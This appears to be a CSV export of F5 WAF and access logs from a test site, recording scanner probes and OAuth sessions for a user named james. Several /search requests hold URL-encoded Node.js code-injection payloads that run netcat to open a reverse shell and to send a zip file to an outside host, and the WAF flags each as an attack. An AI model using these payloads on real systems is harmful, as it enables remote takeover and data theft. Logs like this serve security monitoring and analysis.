time,client_platform,client_reputation,content_length,content_type,dest_ip,host,http_domain,ip_bytes_in,ip_bytes_out,login_result,referer,session_id,session_state,source_ip,total_byte_in,total_byte_out,uri_path,uri_query,username,waf_detected,waf_policy,waf_severity,waf_sig_name,waf_status,waf_support_id
2020-04-29T01:40:56.420,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,256","1,827",,,,,58.176.178.87,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823850000
2020-04-29T01:40:56.411,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,313","1,827",,,,,71.163.246.137,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE ATTACK_TYPE_CROSS_SITE_REQUEST_FORGERY,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823630000
2020-04-29T01:40:56.258,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,314","1,827",,,,,116.108.98.226,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE ATTACK_TYPE_CROSS_SITE_REQUEST_FORGERY,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823850000
2020-04-29T01:40:56.258,,,0,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,272","1,827",,,,,106.157.34.67,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823910000
2020-04-29T01:40:56.209,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,325","1,827",,,,,91.57.238.202,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:40:56.208,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com:443,"1,283","1,827",,,,,56.241.145.64,,,/my.logout.php3,errorcode=19,,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:40:56.106,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,257","1,827",,,,,100.195.98.85,,,/HNAP1,,,ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Error,,alarmed,6018701494823850000
2020-04-29T01:40:56.106,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,313","1,827",,,,,111.11.130.217,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE ATTACK_TYPE_CROSS_SITE_REQUEST_FORGERY,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823850000
2020-04-29T01:40:56.106,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,253","1,827",,,,,34.64.91.57,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE ATTACK_TYPE_HTTP_PARSER_ATTACK,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823850000
2020-04-29T01:40:56.057,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,262","1,827",,,,,99.140.233.237,,,/evox/about,,,ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Error,,alarmed,6018701494823630000
2020-04-29T01:40:56.057,,,0,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,286","1,827",,,,,106.108.147.201,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823630000
2020-04-29T01:40:56.056,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com:443,"1,265","1,827",,,,,49.98.198.226,,,/my.policy,,,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:40:55.960,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,314","1,827",,,,,142.15.45.218,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE ATTACK_TYPE_CROSS_SITE_REQUEST_FORGERY,/Common/f5bd_wafpolicy,Critical,,alarmed,6561110780036880000
2020-04-29T01:40:55.955,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,276","1,827",,,,,78.66.5.94,,,/nmaplowercheck1588095659,,,ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Error,,alarmed,6018701494823910000
2020-04-29T01:40:55.955,,,441,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,718","1,827",,,,,59.155.108.211,,,/sdk,,,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Error,,alarmed,6018701494823630000
2020-04-29T01:40:55.954,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,261","1,827",,,,,88.248.139.14,,,/.git/HEAD,,,ATTACK_TYPE_PREDICTABLE_RESOURCE_LOCATION ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Error,"{""""/.git/"""" access}",alarmed,6018701494823580000
2020-04-29T01:40:55.954,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,318","1,827",,,,,70.201.181.240,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823910000
2020-04-29T01:40:55.954,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,267","1,827",,,,,43.16.0.216,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE,/Common/f5bd_wafpolicy,Critical,,alarmed,13475394135252100000
2020-04-29T01:40:55.954,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,256","1,827",,,,,57.184.215.20,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE,/Common/f5bd_wafpolicy,Critical,,alarmed,13475394135252100000
2020-04-29T01:40:55.954,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,267","1,827",,,,,73.38.249.83,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823910000
2020-04-29T01:40:55.954,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,262","1,827",,,,,65.110.223.116,,,/robots.txt,,,ATTACK_TYPE_BUFFER_OVERFLOW ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Critical,,alarmed,6018701494823630000
2020-04-29T01:40:55.953,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,256","1,827",,,,,112.117.147.22,,,/,,,ATTACK_TYPE_INFORMATION_LEAKAGE,/Common/f5bd_wafpolicy,Critical,,alarmed,13475394135252100000
2020-04-29T01:40:55.953,,,88,application/x-www-form-urlencoded,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,410","1,827",,,,,136.38.132.207,,,/,,,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY,/Common/f5bd_wafpolicy,Error,,alarmed,6018701494823910000
2020-04-29T01:39:57.810,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,132.138.22.187,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:39:03.834,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,044",519,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"33,933","19,422",/js/main.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823630000
2020-04-29T01:39:03.829,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,051",467,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"33,933","19,422",/js/popper.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:39:03.829,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,054",519,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"33,933","19,422",/js/bootstrap.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:39:03.827,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,058",467,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"33,933","19,422",/js/jquery-3.3.1.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823910000
2020-04-29T01:39:03.795,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"4,779","6,459",allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"33,933","19,422",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823630000
2020-04-29T01:39:03.716,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"3,596","3,717",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"33,933","19,422",/,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823630000
2020-04-29T01:39:03.674,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,300","1,827",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"33,933","19,422",/logout,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:38:50.947,,,,,192.168.10.101,192.168.10.101,,"1,114","1,827",,,,,122.174.61.80,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:34:58.655,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,37.212.232.53,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:34:17.121,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,009",519,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/popper.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:34:17.116,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,004",467,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/chart.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823630000
2020-04-29T01:34:17.106,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"7,503","95,329",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/dropzone.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:34:17.101,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,003",519,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/main.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:34:17.094,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,012",519,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/bootstrap.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823630000
2020-04-29T01:34:17.063,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"20,829","399,867",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"27,006","14,374",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:34:17.062,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"3,164","2,370",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/jquery-3.3.1.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:34:16.372,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"19,265","387,482",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/pf/Users/james,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:34:16.346,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"4,132","23,788",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/login/oauth,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:34:16.292,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"5,538","63,131",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/oauth/client/redirect,code=8e12e973f85d87dac792717e9618b042fb041d19db3a351488512dc38bfebdf4&state=000fffff96d1a672,james,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Error,,alarmed,13475394135252100000
2020-04-29T01:34:09.821,MacOS,None,81,application/x-www-form-urlencoded,192.168.10.101,192.168.10.101,www.f5bdtest.com,"6,947","93,889",allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/login/oauth,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:34:08.516,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,995",467,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/popper.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823910000
2020-04-29T01:34:08.515,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,998",519,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/bootstrap.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:34:08.514,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,001",467,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/jquery-3.3.1.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823580000
2020-04-29T01:34:08.507,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,989",519,allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/js/main.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:34:08.474,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"3,449","4,569",allow,https://www.f5bdtest.com/,f8206fd6,allow,175.45.176.100,"27,006","14,374",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:34:08.361,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,235","1,827",allow,,f8206fd6,allow,175.45.176.100,"27,006","14,374",/,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:29:58.493,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,43.121.136.11,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:24:58.027,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,42.226.67.17,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:19:57.974,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,67.228.50.116,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:15:33.621,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"19,925","396,811",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"24,405","13,286",/search,keyword=res.end%28require%28%27child_process%27%29.execSync%28%27nc+10.245.13.123+4444+-e+%2Fbin%2Fsh+%26%27%29%29,james,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY ATTACK_TYPE_SERVER_SIDE_CODE_INJECTION,/Common/f5bd_wafpolicy,Error,{JavaScript Code Injection - require(); (Parameter)},alarmed,6561110780036880000
2020-04-29T01:15:30.958,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"5,113","13,748",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"24,405","13,286",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:15:30.176,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"3,601","1,363",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,94.139.124.214,"24,405","13,286",/pf/Users/james,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:15:09.624,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,288",467,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"22,761","12,691",/search,keyword=res.end%28require%28%27child_process%27%29.execSync%28%27nc+10.245.13.123+4444+-e+%2Fbin%2Fsh+%26%27%29%29,james,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY ATTACK_TYPE_SERVER_SIDE_CODE_INJECTION,/Common/f5bd_wafpolicy,Error,{JavaScript Code Injection - require(); (Parameter)},alarmed,6561110780036880000
2020-04-29T01:14:57.870,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,122.94.242.225,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:13:33.231,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,004",519,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/chart.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:13:33.212,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,007",519,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/dropzone.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:13:33.211,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,003",519,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/main.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823630000
2020-04-29T01:13:33.210,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"22,644","479,151",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/bootstrap.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:13:33.208,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,009",467,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/popper.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823580000
2020-04-29T01:13:33.170,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"18,560","385,839",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/jquery-3.3.1.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:13:33.166,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"4,837","14,029",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"15,687","6,335",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:13:32.837,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"3,349","2,370",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/pf/Users/james,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:13:32.811,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"4,080","23,788",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/login/oauth,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:13:32.755,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"5,590","63,235",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/oauth/client/redirect,code=3e9a3ebddfa5c5fde044399c3aeec69240f35d3b08c3420f4798f8c6ce65ad77&state=000fffffbbf17c0c,james,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY ATTACK_TYPE_FORCEFUL_BROWSING,/Common/f5bd_wafpolicy,Error,,alarmed,13475394135252100000
2020-04-29T01:13:24.496,MacOS,None,81,application/x-www-form-urlencoded,192.168.10.101,192.168.10.101,www.f5bdtest.com,"6,531","93,241",allow,https://www.f5bdtest.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/login/oauth,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:13:23.316,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,989",519,allow,https://www.f5bdtest.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/main.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:13:23.308,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,001",467,allow,https://www.f5bdtest.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/jquery-3.3.1.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823910000
2020-04-29T01:13:23.307,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,995",467,allow,https://www.f5bdtest.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/popper.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823580000
2020-04-29T01:13:23.301,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,998",519,allow,https://www.f5bdtest.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/js/bootstrap.min.js,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T01:13:23.270,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"3,449","4,569",allow,https://www.f5bdtest.com/,f8206fd6,allow,94.139.124.214,"15,687","6,335",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T01:13:23.126,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,235","1,827",allow,,f8206fd6,allow,94.139.124.214,"15,687","6,335",/,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:09:57.806,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,136.62.171.108,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T01:04:57.735,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,68.131.78.110,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T00:59:58.646,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,53.34.1.11,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T00:54:58.547,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,93.178.120.15,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T00:54:40.533,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,153",519,allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,94.139.124.214,"14,171","5,740",/pf/Users/james,,james,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T00:50:49.587,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"2,288",467,allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"12,527","5,145",/search,keyword=res.end%28require%28%27child_process%27%29.execSync%28%27nc+-w+3+10.245.13.123+8888+%3C+James.zip%27%29%29,james,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY ATTACK_TYPE_SERVER_SIDE_CODE_INJECTION,/Common/f5bd_wafpolicy,Error,{JavaScript Code Injection - require(); (Parameter)},alarmed,6561110780036880000
2020-04-29T00:49:58.456,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,107.60.3.164,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T00:46:56.478,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:46:48.287,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:46:44.191,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:46:42.174,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:46:41.164,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:44:58.302,,,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"1,178","1,827",,,,,100.102.82.95,,,/,,,,/Common/f5bd_wafpolicy,Informational,,clear,13475394135252100000
2020-04-29T00:42:40.279,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"40,746","944,044",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"11,570","4,652",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T00:42:39.945,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:42:39.935,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:42:39.888,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:42:39.863,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"39,182","931,803",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,94.139.124.214,"11,570","4,652",/pf/Users/james,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
2020-04-29T00:42:39.663,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:42:28.014,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"37,869","930,931",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"9,926","4,057",/search,keyword=res.end%28require%28%27child_process%27%29.execSync%28%27nc+-w+3+10.245.13.123+8888+%3C+James.zip%27%29%29,james,ATTACK_TYPE_ABUSE_OF_FUNCTIONALITY ATTACK_TYPE_SERVER_SIDE_CODE_INJECTION,/Common/f5bd_wafpolicy,Error,{JavaScript Code Injection - require(); (Parameter)},alarmed,6561110780036880000
2020-04-29T00:41:39.776,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"29,257","545,078",allow,https://www.f5bdtest.com/pf/Users/james,f8206fd6,allow,94.139.124.214,"7,357","2,873",/style.css,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6018701494823850000
2020-04-29T00:41:39.445,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:41:39.396,,,,,,192.168.10.101,,,,,,,,,,,,,,,,,,,
2020-04-29T00:41:39.345,MacOS,None,,,192.168.10.101,192.168.10.101,www.f5bdtest.com,"27,769","533,459",allow,https://oauth.landing.f5sgdemo.com/,f8206fd6,allow,94.139.124.214,"7,357","2,873",/pf/Users/james,,james,,/Common/f5bd_wafpolicy,Informational,,clear,6561110780036880000
